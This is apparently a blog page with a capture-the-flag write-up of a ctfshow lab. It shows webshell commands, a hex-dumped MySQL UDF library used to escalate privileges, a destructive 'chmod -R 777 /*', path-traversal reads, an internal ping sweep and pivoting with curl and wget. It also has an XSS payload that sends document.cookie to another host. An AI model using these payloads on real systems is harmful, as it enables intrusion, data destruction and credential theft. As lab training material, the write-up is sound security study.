000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=file_put_contents(&#x27;udf.txt&#x27;,hex2bin(&#x27;7F454C4602010100000000000000000003003E00&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>查看插件位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>查看是否能够写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530213014.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=shell_exec(&#x27;cp udf.txt /usr/lib/mariadb/plugin/udf.so&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530204447.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo cat /root/you_win&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo chmod -R 777 /*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;cat /F*/F*&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctfshow&quot;);</span><br><span class="line">$tmp = $mysqli-&gt;query($_POST[&#x27;sql&#x27;]);</span><br><span class="line">$result = $tmp-&gt;fetch_all();</span><br><span class="line">print_r($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><p>由于shell 带不出来，disable_function也绕不过去，所以，就还是用shell打吧；蚁剑连接还可以上传文件，这个差不多够了</p>
+<p>查看网段cat &#x2F;etc&#x2F;hosts </p>
+<p>172.2.121.4</p>
+<p>cat &#x2F;etc&#x2F;hosts</p>
+<p>scan.sh 运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for ip in `seq 1 50`</span><br><span class="line">  do</span><br><span class="line">   &#123;</span><br><span class="line">  ping -c 1 172.2.121.$ip &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    if [ $? -eq 0 ];then</span><br><span class="line">     echo 172.2.121.$ip UP</span><br><span class="line">    else</span><br><span class="line">     echo 172.2.121.$ip DOWN</span><br><span class="line">   fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.2.132.1 UP</span><br><span class="line">172.2.132.4 UP</span><br><span class="line">172.2.132.2 UP</span><br><span class="line">172.2.132.3 UP</span><br><span class="line">172.2.132.7 UP</span><br><span class="line">172.2.132.5 UP</span><br><span class="line">172.2.132.6 UP</span><br></pre></td></tr></table></figure>
+
+<p>信息搜集一下，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/phpinfo.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>disallowed &#x2F;public&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/public/Readme.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>恭喜师傅来到第二关！ 第二关相比第一关，依旧是没有难度。 glhf!                ctshow 大菜鸡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `wget http://172.2.132.5/www.zip`;</span><br></pre></td></tr></table></figure>
+
+<p>，然后，访问下载，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">login</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">index</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">main</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line">    	<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">         <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">		));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>=<span class="string">&#x27;管理员请注意，下面是最近登陆失败用户：&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span>=db::<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    	<span class="variable">$html</span> .=<span class="string">&#x27;------------&lt;br&gt;用户名: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>[<span class="number">0</span>]).<span class="string">&#x27;&lt;br&gt;登陆失败时间: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">1</span>]</span><br><span class="line">    	.<span class="string">&#x27;&lt;br&gt;登陆失败IP: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">2</span>].</span><br><span class="line">    	<span class="string">&#x27;&lt;br&gt;------------&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$u</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$u</span>);</span><br><span class="line">	<span class="variable">$p</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$res</span> = db::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select username from ctfshow_users where username = &#x27;<span class="subst">$u</span>&#x27; and password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$date</span> = <span class="keyword">new</span> <span class="title class_">DateTime</span>(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">	<span class="variable">$now</span> = <span class="variable">$date</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$res</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"> 		 db::<span class="title function_ invoke__">insert</span>(<span class="string">&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#x27;<span class="subst">$u</span>&#x27;,&#x27;<span class="subst">$now</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>);</span><br><span class="line">		 <span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;账号或密码错误&#x27;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">auth</span>())&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;AuthKey 错误&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag_660&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$auth</span>==AUTH_KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span>  FLAG_657;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$f</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>)).<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="variable">$result</span> = FLAG_658;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;数据获取失败&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$m</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;getFlag&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;testFile&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">testFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment"># code...</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;请先登陆&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后来环境重开了，网段改变了，注意一下</p>
+<p>存在目录穿越漏洞</p>
+<p><img src="/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230601170949.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;curl http://172.2.132.5/public../FLAG/flag659.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;73c4213829f8b393b2082bacb4253cab&#125; </span><br></pre></td></tr></table></figure>
+
+<p>访问日志文件，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.238.5/public../var/log/nginx/</span><br><span class="line">ctfshow_web_access_log_file_you_never_know.log&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?action=login&amp;u=admin&amp;p=nE7jA5m&amp;flag=flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>
+
+<p>剩下的学习一下，再写吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl http://172.2.121.5:8888`;</span><br></pre></td></tr></table></figure>
+
+<p>xss </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=echo `curl  --header &quot;X-Forwarded-For:&lt;script&gt;window.location.href=\&quot;http://172.2.26.4:80/system36d/util/a.php?a=\&quot;+document.cookie&lt;/script&gt;&quot; http://172.2.26.5:80/index.php?action=login&amp;u=1&amp;p=2`;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="资产梳理"><a href="#资产梳理" class="headerlink" title="资产梳理"></a>资产梳理</h1>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/21b16ab18c2680bb.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="https://s3.bmp.ovh/imgs/2024/03/14/d41c13eba802dd0b.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctfshow/" rel="tag"># ctfshow</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2024/03/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="java反序列化">
+      java反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#getshell"><span class="nav-number">1.</span> <span class="nav-text">getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.</span> <span class="nav-text">写入木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#udf%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">udf提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">内网横向渗透</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86"><span class="nav-number"></span> <span class="nav-text">资产梳理</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="小zhou"
+      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+  <p class="site-author-name" itemprop="name">小zhou</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">小zhou</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">30k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:48</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div> -->
+<!-- <br /> -->
+<!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<!-- <span id="times">载入时分秒...</span> -->
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); 
+        if(String(snum).length ==1 ){snum = "0" + snum;}
+        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/clicklove.js"></script>
